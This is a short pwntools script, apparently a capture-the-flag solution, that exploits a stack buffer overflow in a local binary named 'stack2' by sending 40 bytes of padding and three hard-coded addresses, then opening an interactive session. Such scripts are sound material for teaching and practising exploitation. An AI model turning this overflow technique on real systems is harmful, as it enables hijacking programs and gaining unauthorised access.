from pwn import *

p = process("./stack2")
p.sendline(b'A'*40 + p64(0x4011d8) + p64(0x4011ed) + p64(0x401196))
p.interactive()